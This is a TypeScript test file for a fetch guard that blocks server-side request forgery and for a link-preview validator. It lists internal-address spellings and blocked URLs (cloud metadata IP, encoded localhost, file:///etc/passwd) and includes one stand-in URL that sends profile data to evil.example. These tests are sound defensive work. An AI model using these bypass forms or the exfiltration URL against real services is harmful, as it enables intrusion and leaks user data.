import { describe, expect, it } from "vitest";
import { GlyfDefSchema } from "../src/schemas/glyfdef.js";
import { validateUserDef } from "../src/lib/userglyfs.js";
import { BlockedUrlError, checkUrl, isBlockedAddress, safeFetchText } from "../src/lib/safefetch.js";

describe("safefetch keeps pasted links off the server's own network", () => {
  it("refuses internal addresses in every spelling", () => {
    for (const ip of [
      "127.0.0.1", "10.1.2.3", "172.16.0.1", "192.168.1.1", "169.254.169.254", "100.64.0.1",
      "0.0.0.0", "224.0.0.1", "255.255.255.255", "::1", "::", "fe80::1", "fd00:ec2::254", "fc00::1",
      "::ffff:127.0.0.1", "::ffff:7f00:1", "::ffff:169.254.169.254", "64:ff9b::a9fe:a9fe",
      "2002:7f00:1::", "ff02::1", "not-an-ip",
    ]) expect(isBlockedAddress(ip), ip).toBe(true);
  });

  it("lets public addresses through", () => {
    for (const ip of ["8.8.8.8", "1.1.1.1", "2606:4700:4700::1111", "::ffff:8.8.8.8"]) {
      expect(isBlockedAddress(ip), ip).toBe(false);
    }
  });

  it("refuses bad schemes, ports, credentials and internal names before any request", () => {
    for (const url of [
      "file:///etc/passwd", "gopher://example.com/", "http://localhost/", "http://foo.internal/",
      "http://printer.local/", "http://user:pw@example.com/", "http://example.com:22/",
      "http://2130706433/", "http://0x7f.0.0.1/", "http://[::1]/", "http://[::ffff:127.0.0.1]/", "http://intranet/",
    ]) expect(() => checkUrl(url), url).toThrow(BlockedUrlError);
    expect(checkUrl("https://example.com/a?b=c").hostname).toBe("example.com");
  });

  it("refuses a literal internal address without dialling it", async () => {
    await expect(safeFetchText("http://127.0.0.1:8080/", { timeoutMs: 2000 })).rejects.toBeInstanceOf(BlockedUrlError);
  });
});

describe("a user glyf's link preview opens only what was typed", () => {
  const def = (url: string) => GlyfDefSchema.parse({
    id: "user.x", name: "Peek", icon: "link", version: 1, input: "selection",
    discloses: ["the link you type"],
    requires: { fullAccess: true, connectors: [], wallet: false },
    output: { mode: "preview", from: "page" },
    steps: [{ id: "a", type: "tool", tool: "url.unfurl", args: { url }, out: "page" }],
  });
  it("allows {{input}} and refuses an address built from anything else", () => {
    expect(validateUserDef(def("{{input}}"))).toBeNull();
    expect(validateUserDef(def("https://evil.example/?d={{profile}}"))).toMatch(/only open the link you type/);
  });
});
